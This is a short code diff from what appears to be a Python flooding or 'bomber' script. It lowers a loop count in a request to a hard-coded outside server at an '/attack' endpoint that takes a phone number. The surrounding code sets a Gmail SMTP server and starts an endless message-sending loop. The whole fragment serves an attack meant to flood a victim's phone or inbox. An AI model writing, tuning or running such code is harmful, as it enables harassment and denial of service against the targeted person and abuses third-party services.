@@ -76,7 +76,7 @@ def init():
 	'server':'smtp.gmail.com',
 	}
 	try:
-		   	requests.get(f'http://144.217.235.227:3000/attack?number={numero}&loops=1000')
+		   	requests.get(f'http://144.217.235.227:3000/attack?number={numero}&loops=200')
 		   	while True:
 		   		##############################
 	   			msg = email.message.Message()
